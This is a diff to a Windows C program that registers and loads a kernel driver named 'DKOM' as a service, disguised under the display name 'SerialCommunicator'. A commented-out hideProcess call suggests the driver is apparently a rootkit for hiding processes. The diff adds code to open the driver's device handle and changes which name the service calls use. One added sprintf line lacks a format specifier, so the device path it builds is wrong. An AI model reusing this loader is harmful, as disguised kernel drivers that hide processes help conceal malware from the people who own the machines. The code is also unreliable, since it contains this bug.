@@ -30,6 +30,9 @@ int main(int argc, char *argv[])
 	//else
 	char* driverName = "DKOM";
 	char* displayName = "SerialCommunicator"; // friendly name
+	char driverToOpen[512];
+	sprintf(driverToOpen, "\\\\.\\", driverName); // "\\\\.\\DKOM" for example
+	HANDLE hFile = CreateFile(driverToOpen, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL); // open driver
 	if (loadSysFile(driverName, displayName))//"friendly driver"))//argv[1]);
 		printf("success");//hideProcess(driverName, 4); //(int)argv[1]);
 	else
@@ -66,7 +69,7 @@ bool loadSysFileSCM(char* driverName, char* displayName) // load manually with s
 	printf(frmtStr);
 	
 	SC_HANDLE driverHandle = CreateService(scmHandle, // Handle to SCManager
-		displayName,//driverName, // Service Name
+		driverName, // Service Name
 		displayName, // Display Name
 		SERVICE_ALL_ACCESS, // Desired Access
 		SERVICE_KERNEL_DRIVER, // Service Type
@@ -85,7 +88,7 @@ bool loadSysFileSCM(char* driverName, char* displayName) // load manually with s
 		{ // Service exists
 			Logs::log->Write("service exists\n");
 			printf("service exists\n");
-			driverHandle = OpenService(scmHandle, displayName/*driverName*/, SERVICE_ALL_ACCESS); // get a handle to the existing service handle
+			driverHandle = OpenService(scmHandle, driverName, SERVICE_ALL_ACCESS); // get a handle to the existing service handle
 			if (!driverHandle)
 			{
 				sprintf(frmtStr, "couldn't get existing service handle(%d)\n", GetLastError());
